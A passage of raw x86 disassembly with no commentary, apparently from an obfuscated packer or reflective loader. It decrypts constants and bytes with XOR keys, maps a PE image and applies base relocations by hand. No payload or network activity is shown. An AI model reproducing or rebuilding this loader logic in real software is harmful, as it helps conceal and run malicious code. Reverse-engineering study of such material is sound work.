  41762b:	xor    ecx,ebx
  41762d:	lea    ecx,[ecx+edi*1+0x3272e2]
  417634:	xor    ecx,ebx
  417636:	cmp    ecx,0xf89c85bd
  41763c:	jne    0x417605
  41763e:	jmp    0x417647
  417640:	mov    eax,DWORD PTR [ebp-0x14]
  417643:	xor    eax,ebx
  417645:	add    eax,esi
  417647:	mov    ecx,DWORD PTR [ebp-0x14]
  41764a:	xor    ecx,ebx
  41764c:	add    ecx,esi
  41764e:	cmp    ecx,eax
  417650:	je     0x4177c6
  417656:	mov    eax,DWORD PTR [ebp-0x10]
  417659:	mov    eax,DWORD PTR [eax+0x8]
  41765c:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  417663:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41766a:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  417671:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  417678:	mov    DWORD PTR [ebp-0x20],eax
  41767b:	mov    eax,DWORD PTR [ebp+0x8]
  41767e:	mov    ecx,DWORD PTR [ebp-0x24]
  417681:	xor    ecx,ebx
  417683:	add    ecx,esi
  417685:	push   ecx
  417686:	mov    ecx,DWORD PTR [ebp-0x48]
  417689:	mov    eax,DWORD PTR [eax+0x1d8]
  41768f:	xor    ecx,ebx
  417691:	add    ecx,esi
  417693:	push   ecx
  417694:	mov    ecx,DWORD PTR [ebp-0x40]
  417697:	xor    ecx,ebx
  417699:	add    ecx,esi
  41769b:	push   ecx
  41769c:	mov    ecx,DWORD PTR [ebp-0xc]
  41769f:	xor    ecx,ebx
  4176a1:	add    ecx,esi
  4176a3:	push   ecx
  4176a4:	call   DWORD PTR [eax+0x14]
  4176a7:	mov    edi,eax
  4176a9:	mov    eax,DWORD PTR [ebp+0x8]
  4176ac:	mov    ecx,DWORD PTR [ebp-0x24]
  4176af:	mov    eax,DWORD PTR [eax+0x1d8]
  4176b5:	xor    ecx,ebx
  4176b7:	add    ecx,esi
  4176b9:	push   ecx
  4176ba:	mov    ecx,DWORD PTR [ebp-0x48]
  4176bd:	xor    ecx,ebx
  4176bf:	add    ecx,esi
  4176c1:	push   ecx
  4176c2:	mov    ecx,DWORD PTR [ebp-0xc]
  4176c5:	push   DWORD PTR [ebp-0x20]
  4176c8:	xor    ecx,ebx
  4176ca:	add    ecx,esi
  4176cc:	push   ecx
  4176cd:	call   DWORD PTR [eax+0x14]
  4176d0:	mov    ecx,DWORD PTR [ebp-0xc]
  4176d3:	xor    ecx,ebx
  4176d5:	add    ecx,esi
  4176d7:	mov    DWORD PTR [ebp-0x24],eax
  4176da:	cmp    ecx,edi
  4176dc:	je     0x417a69
  4176e2:	mov    ecx,DWORD PTR [ebp-0xc]
  4176e5:	xor    ecx,ebx
  4176e7:	add    ecx,esi
  4176e9:	cmp    ecx,eax
  4176eb:	je     0x417a69
  4176f1:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  4176f8:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  4176ff:	mov    ecx,DWORD PTR [ebp-0x40]
  417702:	xor    cl,0x9b
  417705:	sub    cl,0x1e
  417708:	mov    BYTE PTR [edi],cl
  41770a:	mov    ecx,DWORD PTR [ebp-0xc]
  41770d:	xor    cl,0x9b
  417710:	sub    cl,0x1e
  417713:	mov    BYTE PTR [edi+0x1],cl
  417716:	mov    ecx,DWORD PTR [ebp-0x4c]
  417719:	xor    cl,0x9b
  41771c:	sub    cl,0x1e
  41771f:	mov    BYTE PTR [edi+0x2],cl
  417722:	and    DWORD PTR [ebp-0xb4],0x0
  417729:	and    DWORD PTR [ebp-0xa4],0x0
  417730:	lea    ecx,[ebp-0xa4]
  417736:	push   ecx
  417737:	push   DWORD PTR [ebp-0x20]
  41773a:	push   eax
  41773b:	lea    eax,[ebp-0xb4]
  417741:	push   eax
  417742:	mov    eax,DWORD PTR [ebp-0x10]
  417745:	push   DWORD PTR [eax+0xc]
  417748:	mov    eax,DWORD PTR [ebp-0x2c]
  41774b:	add    eax,0x10
  41774e:	push   eax
  41774f:	push   edi
  417750:	call   0x416a9a
  417755:	mov    DWORD PTR [ebp-0x40],eax
  417758:	mov    eax,DWORD PTR [ebp+0x8]
  41775b:	mov    ecx,DWORD PTR [ebp-0x50]
  41775e:	mov    eax,DWORD PTR [eax+0x1d8]
  417764:	xor    ecx,ebx
  417766:	add    ecx,esi
  417768:	push   ecx
  417769:	mov    ecx,DWORD PTR [ebp-0xc]
  41776c:	xor    ecx,ebx
  41776e:	add    ecx,esi
  417770:	push   ecx
  417771:	push   edi
  417772:	call   DWORD PTR [eax+0x18]
  417775:	mov    eax,DWORD PTR [ebp-0x40]
  417778:	add    eax,0xffcd8d1e
  41777d:	xor    eax,ebx
  41777f:	cmp    eax,0xf89c8585
  417784:	mov    eax,DWORD PTR [ebp+0x8]
  417787:	mov    eax,DWORD PTR [eax+0x1d8]
  41778d:	mov    ecx,DWORD PTR [ebp-0x50]
  417790:	jne    0x4177b3
  417792:	xor    ecx,ebx
  417794:	add    ecx,esi
  417796:	push   ecx
  417797:	mov    ecx,DWORD PTR [ebp-0xc]
  41779a:	xor    ecx,ebx
  41779c:	add    ecx,esi
  41779e:	push   ecx
  41779f:	push   DWORD PTR [ebp-0x2c]
  4177a2:	call   DWORD PTR [eax+0x18]
  4177a5:	mov    eax,DWORD PTR [ebp-0x24]
  4177a8:	mov    DWORD PTR [ebp-0x2c],eax
  4177ab:	mov    eax,DWORD PTR [ebp-0x20]
  4177ae:	mov    DWORD PTR [ebp-0x3c],eax
  4177b1:	jmp    0x4177c6
  4177b3:	xor    ecx,ebx
  4177b5:	add    ecx,esi
  4177b7:	push   ecx
  4177b8:	mov    ecx,DWORD PTR [ebp-0xc]
  4177bb:	xor    ecx,ebx
  4177bd:	add    ecx,esi
  4177bf:	push   ecx
  4177c0:	push   DWORD PTR [ebp-0x24]
  4177c3:	call   DWORD PTR [eax+0x18]
  4177c6:	mov    eax,DWORD PTR [ebp-0x3c]
  4177c9:	mov    DWORD PTR [ebp-0x38],eax
  4177cc:	mov    eax,DWORD PTR [ebp-0x2c]
  4177cf:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  4177d6:	mov    DWORD PTR [ebp-0x40],eax
  4177d9:	mov    edi,0xf89c8584
  4177de:	mov    DWORD PTR [ebp-0x30],edi
  4177e1:	mov    eax,DWORD PTR [ebp-0x28]
  4177e4:	xor    eax,ebx
  4177e6:	add    eax,esi
  4177e8:	mov    DWORD PTR [ebp-0xc],eax
  4177eb:	mov    eax,DWORD PTR [ebp-0x28]
  4177ee:	xor    eax,ebx
  4177f0:	add    eax,esi
  4177f2:	mov    DWORD PTR [ebp-0x10],eax
  4177f5:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  4177fc:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  417803:	mov    eax,DWORD PTR [ebp-0x28]
  417806:	mov    ecx,DWORD PTR [ebp-0x38]
  417809:	xor    eax,ebx
  41780b:	add    eax,esi
  41780d:	cmp    ecx,eax
  41780f:	je     0x417a05
  417815:	jmp    0x4179e1
  41781a:	mov    ecx,DWORD PTR [ebp-0xc]
  41781d:	mov    eax,DWORD PTR [ebp-0x38]
  417820:	sub    eax,ecx
  417822:	mov    ecx,DWORD PTR [ebp-0x48]
  417825:	xor    ecx,ebx
  417827:	add    ecx,esi
  417829:	xor    edx,edx
  41782b:	div    ecx
  41782d:	mov    DWORD PTR [ebp-0x10],eax
  417830:	mov    eax,DWORD PTR [ebp-0x24]
  417833:	mov    ecx,DWORD PTR [ebp-0x10]
  417836:	xor    eax,ebx
  417838:	add    eax,esi
  41783a:	cmp    ecx,eax
  41783c:	jbe    0x417848
  41783e:	mov    eax,DWORD PTR [ebp-0x24]
  417841:	xor    eax,ebx
  417843:	add    eax,esi
  417845:	mov    DWORD PTR [ebp-0x10],eax
  417848:	mov    eax,DWORD PTR [ebp-0x48]
  41784b:	mov    ecx,DWORD PTR [ebp-0x10]
  41784e:	xor    eax,ebx
  417850:	add    eax,esi
  417852:	imul   eax,ecx
  417855:	mov    DWORD PTR [ebp-0x10],eax
  417858:	mov    eax,DWORD PTR [ebp-0x28]
  41785b:	mov    ecx,DWORD PTR [ebp-0x10]
  41785e:	xor    eax,ebx
  417860:	add    eax,esi
  417862:	cmp    ecx,eax
  417864:	je     0x4179cf
  41786a:	mov    eax,DWORD PTR [ebp-0x10]
  41786d:	mov    DWORD PTR [ebp-0x20],eax
  417870:	mov    eax,DWORD PTR [ebp-0xc]
  417873:	add    eax,DWORD PTR [ebp-0x40]
  417876:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41787d:	mov    DWORD PTR [ebp-0x10],edi
  417880:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  417887:	mov    DWORD PTR [ebp-0x1c],eax
  41788a:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  417891:	mov    DWORD PTR [ebp-0x8],edi
  417894:	mov    eax,DWORD PTR [ebp-0x54]
  417897:	xor    eax,ebx
  417899:	add    eax,esi
  41789b:	jmp    0x41798e
  4178a0:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  4178aa:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  4178b4:	mov    eax,DWORD PTR [ebp-0x8]
  4178b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4178ba:	xor    eax,ebx
  4178bc:	add    eax,esi
  4178be:	imul   eax,ecx
  4178c1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4178c4:	mov    al,BYTE PTR [eax+ecx*1]
  4178c7:	mov    BYTE PTR [ebp-0x1],al
  4178ca:	mov    eax,DWORD PTR [ebp-0x8]
  4178cd:	mov    ecx,DWORD PTR [ebp-0x18]
  4178d0:	xor    eax,ebx
  4178d2:	add    eax,esi
  4178d4:	imul   eax,ecx
  4178d7:	mov    ecx,DWORD PTR [ebp-0x4c]
  4178da:	xor    ecx,ebx
  4178dc:	add    eax,ecx
  4178de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4178e1:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  4178e9:	mov    ecx,DWORD PTR [ebp-0xac]
  4178ef:	xor    ecx,ebx
  4178f1:	lea    eax,[ecx+eax*1+0x3272e2]
  4178f8:	movzx  ecx,BYTE PTR [ebp-0x1]
  4178fc:	xor    ecx,eax
  4178fe:	mov    BYTE PTR [ebp-0x1],cl
  417901:	mov    al,BYTE PTR [ebp-0x1]
  417904:	mov    ecx,DWORD PTR [ebp-0x8]
  417907:	mov    edx,DWORD PTR [ebp-0x18]
  41790a:	xor    ecx,ebx
  41790c:	add    ecx,esi
  41790e:	imul   ecx,edx
  417911:	mov    edx,DWORD PTR [ebp-0x1c]
  417914:	mov    BYTE PTR [ecx+edx*1],al
  417917:	mov    eax,DWORD PTR [ebp-0x8]
  41791a:	mov    ecx,DWORD PTR [ebp-0x18]
  41791d:	xor    eax,ebx
  41791f:	add    eax,esi
  417921:	imul   eax,ecx
  417924:	mov    ecx,DWORD PTR [ebp-0x1c]
  417927:	mov    al,BYTE PTR [eax+ecx*1]
  41792a:	mov    BYTE PTR [ebp-0x1],al
  41792d:	mov    eax,DWORD PTR [ebp-0x8]
  417930:	mov    ecx,DWORD PTR [ebp-0x18]
  417933:	xor    eax,ebx
  417935:	add    eax,esi
  417937:	imul   eax,ecx
  41793a:	mov    ecx,DWORD PTR [ebp-0x10]
  41793d:	xor    ecx,ebx
  41793f:	add    eax,ecx
  417941:	mov    ecx,DWORD PTR [ebp-0x1c]
  417944:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41794c:	mov    ecx,DWORD PTR [ebp-0x9c]
  417952:	xor    ecx,ebx
  417954:	lea    eax,[ecx+eax*1+0x3272e2]
  41795b:	movzx  ecx,BYTE PTR [ebp-0x1]
  41795f:	xor    ecx,eax
  417961:	mov    BYTE PTR [ebp-0x1],cl
  417964:	mov    al,BYTE PTR [ebp-0x1]
  417967:	mov    ecx,DWORD PTR [ebp-0x8]
  41796a:	mov    edx,DWORD PTR [ebp-0x18]
  41796d:	xor    ecx,ebx
  41796f:	add    ecx,esi
  417971:	imul   ecx,edx
  417974:	mov    edx,DWORD PTR [ebp-0x1c]
  417977:	mov    BYTE PTR [ecx+edx*1],al
  41797a:	mov    eax,DWORD PTR [ebp-0x34]
  41797d:	mov    ecx,DWORD PTR [ebp-0x10]
  417980:	xor    eax,ebx
  417982:	xor    ecx,ebx
  417984:	add    eax,esi
  417986:	add    ecx,esi
  417988:	imul   eax,ecx
  41798b:	add    eax,DWORD PTR [ebp-0x18]
  41798e:	mov    DWORD PTR [ebp-0x18],eax
  417991:	mov    eax,DWORD PTR [ebp-0x18]
  417994:	mov    ecx,DWORD PTR [ebp-0x20]
  417997:	cmp    ecx,eax
  417999:	jb     0x4178a0
  41799f:	mov    eax,DWORD PTR [ebp-0x10]
  4179a2:	mov    ecx,DWORD PTR [ebp-0x20]
  4179a5:	xor    eax,ebx
  4179a7:	add    eax,esi
  4179a9:	imul   eax,ecx
  4179ac:	mov    ecx,DWORD PTR [ebp-0x54]
  4179af:	xor    ecx,ebx
  4179b1:	add    ecx,esi
  4179b3:	or     eax,ecx
  4179b5:	mov    ecx,DWORD PTR [ebp-0x30]
  4179b8:	xor    ecx,ebx
  4179ba:	add    eax,ecx
  4179bc:	mov    ecx,DWORD PTR [ebp-0x30]
  4179bf:	xor    ecx,ebx
  4179c1:	add    eax,ecx
  4179c3:	mov    ecx,DWORD PTR [ebp-0xc]
  4179c6:	lea    eax,[eax+ecx*1+0x64e5c4]
  4179cd:	jmp    0x4179de
  4179cf:	mov    eax,DWORD PTR [ebp-0x30]
  4179d2:	mov    ecx,DWORD PTR [ebp-0xc]
  4179d5:	xor    eax,ebx
  4179d7:	lea    eax,[eax+ecx*1+0x3272e2]
  4179de:	mov    DWORD PTR [ebp-0xc],eax
  4179e1:	mov    eax,DWORD PTR [ebp-0x30]
  4179e4:	xor    eax,ebx
  4179e6:	mov    ecx,0xffcd8d1e
  4179eb:	sub    ecx,eax
  4179ed:	add    ecx,DWORD PTR [ebp-0x38]
  4179f0:	mov    eax,DWORD PTR [ebp-0x30]
  4179f3:	mov    edx,DWORD PTR [ebp-0xc]
  4179f6:	xor    eax,ebx
  4179f8:	add    eax,esi
  4179fa:	imul   eax,edx
  4179fd:	cmp    eax,ecx
  4179ff:	jbe    0x41781a
  417a05:	push   DWORD PTR [ebp+0x8]
  417a08:	mov    eax,DWORD PTR [ebp+0x8]
  417a0b:	push   DWORD PTR [eax+0x1cc]
  417a11:	lea    eax,[ebp-0xa0]
  417a17:	push   eax
  417a18:	mov    eax,DWORD PTR [ebp+0x8]
  417a1b:	mov    eax,DWORD PTR [eax+0x1c4]
  417a21:	push   DWORD PTR [eax]
  417a23:	mov    eax,DWORD PTR [ebp+0x8]
  417a26:	mov    eax,DWORD PTR [eax+0x1c0]
  417a2c:	push   DWORD PTR [eax]
  417a2e:	push   DWORD PTR [ebp-0x3c]
  417a31:	push   DWORD PTR [ebp-0x2c]
  417a34:	call   0x4184cb
  417a39:	mov    DWORD PTR [ebp-0x40],eax
  417a3c:	mov    eax,DWORD PTR [ebp-0x14]
  417a3f:	mov    ecx,DWORD PTR [ebp-0x2c]
  417a42:	xor    eax,ebx
  417a44:	add    eax,esi
  417a46:	cmp    eax,ecx
  417a48:	je     0x417a69
  417a4a:	mov    eax,DWORD PTR [ebp+0x8]
  417a4d:	mov    ecx,DWORD PTR [ebp-0x50]
  417a50:	mov    eax,DWORD PTR [eax+0x1d8]
  417a56:	xor    ecx,ebx
  417a58:	add    ecx,esi
  417a5a:	push   ecx
  417a5b:	mov    ecx,DWORD PTR [ebp-0x14]
  417a5e:	xor    ecx,ebx
  417a60:	add    ecx,esi
  417a62:	push   ecx
  417a63:	push   DWORD PTR [ebp-0x2c]
  417a66:	call   DWORD PTR [eax+0x18]
  417a69:	pop    edi
  417a6a:	pop    esi
  417a6b:	pop    ebx
  417a6c:	leave  
  417a6d:	ret    0x4
  417a70:	push   ebp
  417a71:	mov    ebp,esp
  417a73:	push   ecx
  417a74:	push   ecx
  417a75:	lea    eax,[ebp-0x8]
  417a78:	mov    DWORD PTR [ebp-0x4],eax
  417a7b:	push   esi
  417a7c:	mov    esi,DWORD PTR [ebp-0x4]
  417a7f:	mov    eax,0xf881ba0f
  417a84:	mov    DWORD PTR [esi],eax
  417a86:	mov    esi,DWORD PTR [ebp-0x8]
  417a89:	cmp    esi,eax
  417a8b:	pop    esi
  417a8c:	jne    0x417a96
  417a8e:	mov    BYTE PTR [ecx+0xa],0x7c
  417a92:	mov    BYTE PTR [edx+0x8],0x2f
  417a96:	mov    BYTE PTR [edx+0xa],0x7c
  417a9a:	mov    BYTE PTR [ecx+0x2],0x2
  417a9e:	leave  
  417a9f:	ret    
  417aa0:	push   ebp
  417aa1:	mov    ebp,esp
  417aa3:	push   ecx
  417aa4:	push   ecx
  417aa5:	lea    eax,[ebp-0x8]
  417aa8:	mov    DWORD PTR [ebp-0x4],eax
  417aab:	mov    edx,DWORD PTR [ebp-0x4]
  417aae:	mov    eax,0xf88b0be3
  417ab3:	mov    DWORD PTR [edx],eax
  417ab5:	mov    edx,DWORD PTR [ebp-0x8]
  417ab8:	cmp    edx,eax
  417aba:	jne    0x417acb
  417abc:	mov    eax,DWORD PTR [ebp+0x8]
  417abf:	mov    BYTE PTR [ecx+0x9],0x8
  417ac3:	mov    BYTE PTR [eax+0x7],0x47
  417ac7:	mov    BYTE PTR [ecx+0x6],0xf
  417acb:	mov    BYTE PTR [ecx+0x3],0x18
  417acf:	leave  
  417ad0:	ret    0x4
  417ad3:	push   ebp
  417ad4:	mov    ebp,esp
  417ad6:	push   ecx
  417ad7:	push   ecx
  417ad8:	lea    eax,[ebp-0x8]
  417adb:	mov    DWORD PTR [ebp-0x4],eax
  417ade:	mov    edx,DWORD PTR [ebp-0x4]
  417ae1:	mov    eax,0x7e0da0f
  417ae6:	mov    DWORD PTR [edx],eax
  417ae8:	mov    edx,DWORD PTR [ebp-0x8]
  417aeb:	cmp    edx,eax
  417aed:	jne    0x417af3
  417aef:	mov    BYTE PTR [ecx+0x7],0x47
  417af3:	mov    eax,DWORD PTR [ebp+0x8]
  417af6:	mov    BYTE PTR [ecx+0x1],0x5
  417afa:	mov    BYTE PTR [eax+0x9],0x28
  417afe:	leave  
  417aff:	ret    0x4
  417b02:	push   ebp
  417b03:	mov    ebp,esp
  417b05:	push   ecx
  417b06:	push   ecx
  417b07:	lea    eax,[ebp-0x8]
  417b0a:	mov    DWORD PTR [ebp-0x4],eax
  417b0d:	push   esi
  417b0e:	mov    esi,DWORD PTR [ebp-0x4]
  417b11:	mov    eax,0x7060e3e
  417b16:	mov    DWORD PTR [esi],eax
  417b18:	mov    esi,DWORD PTR [ebp-0x8]
  417b1b:	cmp    esi,eax
  417b1d:	pop    esi
  417b1e:	jne    0x417b2a
  417b20:	mov    BYTE PTR [edx+0x4],0x3
  417b24:	mov    WORD PTR [ecx+0x3],0x318
  417b2a:	mov    BYTE PTR [edx],0x3f
  417b2d:	leave  
  417b2e:	ret    
  417b2f:	push   ebp
  417b30:	mov    ebp,esp
  417b32:	push   ecx
  417b33:	push   ecx
  417b34:	lea    eax,[ebp-0x8]
  417b37:	mov    DWORD PTR [ebp-0x4],eax
  417b3a:	mov    edx,DWORD PTR [ebp-0x4]
  417b3d:	mov    eax,0xf8870b3f
  417b42:	mov    DWORD PTR [edx],eax
  417b44:	mov    edx,DWORD PTR [ebp-0x8]
  417b47:	cmp    edx,eax
  417b49:	jne    0x417b56
  417b4b:	mov    eax,DWORD PTR [ebp+0x8]
  417b4e:	mov    BYTE PTR [ecx+0x8],0xf
  417b52:	mov    BYTE PTR [eax+0x1],0x5
  417b56:	mov    BYTE PTR [ecx+0x5],0xb
  417b5a:	leave  
  417b5b:	ret    0x4
  417b5e:	push   esi
  417b5f:	mov    ecx,edi
  417b61:	call   0x417b2f
  417b66:	mov    edx,edi
  417b68:	mov    ecx,esi
  417b6a:	mov    BYTE PTR [esi],0x1f
  417b6d:	call   0x417b02
  417b72:	push   esi
  417b73:	mov    ecx,edi
  417b75:	mov    BYTE PTR [esi+0x5],0xb
  417b79:	call   0x417ad3
  417b7e:	push   esi
  417b7f:	mov    BYTE PTR [esi+0x6],0xf
  417b83:	call   0x417aa0
  417b88:	mov    BYTE PTR [esi+0x2],0x2
  417b8c:	mov    edx,esi
  417b8e:	jmp    0x417a70
  417b93:	push   ebp
  417b94:	mov    ebp,esp
  417b96:	push   ecx
  417b97:	mov    ecx,DWORD PTR [edx+0x194]
  417b9d:	push   esi
  417b9e:	mov    esi,DWORD PTR [ebp+0x8]
  417ba1:	mov    esi,DWORD PTR [esi]
  417ba3:	mov    DWORD PTR [ecx],esi
  417ba5:	mov    ecx,DWORD PTR [edx+0x194]
  417bab:	mov    ecx,DWORD PTR [ecx]
  417bad:	mov    esi,DWORD PTR [edx+0x190]
  417bb3:	mov    DWORD PTR [esi],ecx
  417bb5:	mov    eax,DWORD PTR [edx+0x194]
  417bbb:	mov    ecx,DWORD PTR [eax]
  417bbd:	mov    ecx,DWORD PTR [ecx+0x3c]
  417bc0:	add    ecx,DWORD PTR [eax]
  417bc2:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  417bc9:	mov    eax,DWORD PTR [ebp-0x4]
  417bcc:	movzx  ecx,WORD PTR [ecx+0x16]
  417bd0:	xor    eax,0x751089b
  417bd5:	add    eax,0x3272e2
  417bda:	pop    esi
  417bdb:	test   ecx,eax
  417bdd:	je     0x417beb
  417bdf:	mov    eax,DWORD PTR [edx+0x1c8]
  417be5:	mov    DWORD PTR [eax],0xf89c8584
  417beb:	leave  
  417bec:	ret    0x4
  417bef:	push   ebp
  417bf0:	mov    ebp,esp
  417bf2:	sub    esp,0x70
  417bf5:	and    DWORD PTR [ebp-0x20],0x0
  417bf9:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  417c00:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  417c07:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  417c0e:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  417c15:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  417c1c:	mov    eax,DWORD PTR [ebp+0x20]
  417c1f:	mov    eax,DWORD PTR [eax+0x194]
  417c25:	mov    DWORD PTR [ebp-0xc],eax
  417c28:	mov    eax,DWORD PTR [ebp+0x20]
  417c2b:	push   ebx
  417c2c:	push   esi
  417c2d:	mov    esi,DWORD PTR [eax+0x190]
  417c33:	mov    eax,DWORD PTR [ebp+0x20]
  417c36:	mov    eax,DWORD PTR [eax+0x18c]
  417c3c:	mov    DWORD PTR [ebp-0x8],eax
  417c3f:	mov    eax,DWORD PTR [eax]
  417c41:	push   edi
  417c42:	mov    DWORD PTR [ebp-0x4],esi
  417c45:	test   eax,eax
  417c47:	jne    0x417c54
  417c49:	push   DWORD PTR [ebp+0x1c]
  417c4c:	mov    edx,DWORD PTR [ebp+0x20]
  417c4f:	call   0x417b93
  417c54:	mov    eax,DWORD PTR [esi]
  417c56:	mov    ebx,DWORD PTR [esi]
  417c58:	add    ebx,DWORD PTR [eax+0x3c]
  417c5b:	mov    eax,DWORD PTR [ebp+0xc]
  417c5e:	mov    ecx,DWORD PTR [ebp-0x8]
  417c61:	mov    ecx,DWORD PTR [ecx]
  417c63:	mov    esi,0x751089b
  417c68:	xor    eax,esi
  417c6a:	mov    edi,0x3272e2
  417c6f:	add    eax,edi
  417c71:	cmp    eax,ecx
  417c73:	jne    0x417eab
  417c79:	mov    eax,DWORD PTR [ebp-0xc]
  417c7c:	mov    eax,DWORD PTR [eax]
  417c7e:	mov    DWORD PTR [ebp-0x10],eax
  417c81:	mov    eax,DWORD PTR [ebx+0x50]
  417c84:	mov    DWORD PTR [ebp-0x68],eax
  417c87:	mov    eax,DWORD PTR [ebp-0x18]
  417c8a:	xor    eax,esi
  417c8c:	add    eax,edi
  417c8e:	mov    DWORD PTR [ebp-0x64],eax
  417c91:	mov    eax,DWORD PTR [ebp-0x14]
  417c94:	and    DWORD PTR [ebp-0x6c],0x0
  417c98:	xor    eax,esi
  417c9a:	add    eax,edi
  417c9c:	mov    DWORD PTR [ebp-0x60],eax
  417c9f:	lea    eax,[ebp-0x70]
  417ca2:	push   eax
  417ca3:	mov    eax,DWORD PTR [ebp+0x8]
  417ca6:	xor    eax,esi
  417ca8:	add    eax,edi
  417caa:	push   eax
  417cab:	mov    eax,DWORD PTR [ebp+0x20]
  417cae:	add    eax,0xaa
  417cb3:	push   eax
  417cb4:	mov    eax,DWORD PTR [ebp+0x20]
  417cb7:	mov    eax,DWORD PTR [eax+0x198]
  417cbd:	mov    DWORD PTR [ebp-0x70],0x4
  417cc4:	push   DWORD PTR [eax]
  417cc6:	mov    eax,DWORD PTR [ebp+0x10]
  417cc9:	call   eax
  417ccb:	mov    ecx,DWORD PTR [ebp-0xc]
  417cce:	mov    ecx,DWORD PTR [ecx]
  417cd0:	mov    edx,DWORD PTR [ebp-0x8]
  417cd3:	mov    DWORD PTR [ebp-0x6c],eax
  417cd6:	mov    DWORD PTR [ebp+0x1c],eax
  417cd9:	mov    DWORD PTR [edx],ecx
  417cdb:	mov    ecx,DWORD PTR [ebp-0x4]
  417cde:	mov    DWORD PTR [ecx],eax
  417ce0:	mov    eax,DWORD PTR [ebx+0x50]
  417ce3:	mov    DWORD PTR [ebp-0x68],eax
  417ce6:	mov    eax,DWORD PTR [ebp-0x1c]
  417ce9:	xor    eax,esi
  417ceb:	add    eax,edi
  417ced:	mov    DWORD PTR [ebp-0x64],eax
  417cf0:	lea    eax,[ebp-0x20]
  417cf3:	mov    DWORD PTR [ebp-0x60],eax
  417cf6:	lea    eax,[ebp-0x70]
  417cf9:	push   eax
  417cfa:	mov    eax,DWORD PTR [ebp+0x8]
  417cfd:	xor    eax,esi
  417cff:	add    eax,edi
  417d01:	push   eax
  417d02:	mov    eax,DWORD PTR [ebp+0x20]
  417d05:	add    eax,0xee
  417d0a:	push   eax
  417d0b:	mov    eax,DWORD PTR [ebp+0x20]
  417d0e:	mov    eax,DWORD PTR [eax+0x198]
  417d14:	mov    DWORD PTR [ebp-0x70],0x4
  417d1b:	push   DWORD PTR [eax]
  417d1d:	mov    eax,DWORD PTR [ebp+0x10]
  417d20:	call   eax
  417d22:	test   eax,eax
  417d24:	je     0x417d49
  417d26:	and    DWORD PTR [ebp+0xc],0x0
  417d2a:	cmp    DWORD PTR [ebx+0x50],0x0
  417d2e:	jbe    0x417d49
  417d30:	mov    eax,DWORD PTR [ebp+0x1c]
  417d33:	mov    ecx,DWORD PTR [ebp-0x10]
  417d36:	sub    ecx,eax
  417d38:	mov    dl,BYTE PTR [ecx+eax*1]
  417d3b:	inc    DWORD PTR [ebp+0xc]
  417d3e:	mov    BYTE PTR [eax],dl
  417d40:	mov    edx,DWORD PTR [ebp+0xc]
  417d43:	inc    eax
  417d44:	cmp    edx,DWORD PTR [ebx+0x50]
  417d47:	jb     0x417d38
  417d49:	mov    edx,DWORD PTR [ebp+0x1c]
  417d4c:	mov    ecx,DWORD PTR [edx+0x3c]
  417d4f:	add    ecx,edx
  417d51:	mov    eax,DWORD PTR [ecx+0xa0]
  417d57:	mov    ebx,DWORD PTR [ecx+0x28]
  417d5a:	add    eax,edx
  417d5c:	sub    edx,DWORD PTR [ebp-0x10]
  417d5f:	add    ebx,DWORD PTR [ebp+0x1c]
  417d62:	mov    DWORD PTR [ebp+0xc],edx
  417d65:	mov    DWORD PTR [ebp-0x2c],ecx
  417d68:	mov    DWORD PTR [ebp-0x14],ebx
  417d6b:	mov    DWORD PTR [ebp-0x8],0x0
  417d72:	jmp    0x417dee
  417d74:	add    edx,0xfffffff8
  417d77:	shr    edx,1
  417d79:	mov    DWORD PTR [ebp-0x18],edx
  417d7c:	je     0x417dda
  417d7e:	lea    edx,[eax+0x8]
  417d81:	mov    DWORD PTR [ebp-0x4],edx
  417d84:	mov    edx,DWORD PTR [ebp-0x18]
  417d87:	mov    DWORD PTR [ebp-0x18],edx
  417d8a:	mov    edx,DWORD PTR [ebp-0x4]
  417d8d:	movzx  edx,WORD PTR [edx]
  417d90:	mov    DWORD PTR [ebp-0x24],edx
  417d93:	and    edx,0xfff
  417d99:	mov    DWORD PTR [ebp-0x28],edx
  417d9c:	mov    edx,DWORD PTR [ebp-0x24]
  417d9f:	shr    edx,0xc
  417da2:	add    edx,0xffcd8d1e
  417da8:	xor    edx,esi
  417daa:	cmp    edx,0xf89c85ba
  417db0:	jne    0x417dd1
  417db2:	mov    edx,DWORD PTR [ebp-0x28]
  417db5:	add    edx,DWORD PTR [ebp+0x1c]
  417db8:	mov    ebx,DWORD PTR [eax]
  417dba:	cmp    DWORD PTR [ebx+edx*1],0x0
  417dbe:	je     0x417dce
  417dc0:	mov    ecx,DWORD PTR [ebp+0xc]
  417dc3:	add    ecx,DWORD PTR [ebx+edx*1]
  417dc6:	mov    ebx,DWORD PTR [eax]
  417dc8:	mov    DWORD PTR [edx+ebx*1],ecx
  417dcb:	mov    ecx,DWORD PTR [ebp-0x2c]
  417dce:	mov    ebx,DWORD PTR [ebp-0x14]
  417dd1:	add    DWORD PTR [ebp-0x4],0x2
  417dd5:	dec    DWORD PTR [ebp-0x18]
  417dd8:	jne    0x417d8a
  417dda:	mov    edx,DWORD PTR [ebp-0xc]
  417ddd:	add    DWORD PTR [ebp-0x8],edx
  417de0:	mov    edx,DWORD PTR [ebp-0x8]
  417de3:	cmp    edx,DWORD PTR [ecx+0xa4]
  417de9:	jae    0x417dfc
  417deb:	add    eax,DWORD PTR [ebp-0xc]
